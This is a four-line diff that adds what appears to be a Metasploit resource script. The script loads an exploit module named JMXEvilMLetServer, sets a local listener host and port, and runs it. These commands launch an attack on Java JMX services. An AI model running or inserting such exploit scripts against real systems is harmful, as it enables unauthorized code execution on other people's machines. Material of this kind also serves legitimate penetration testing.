@@ -1,0 +1,4 @@
+use exploit JMXEvilMLetServer
+set lhost 127.0.0.1
+set lport 8081
+run
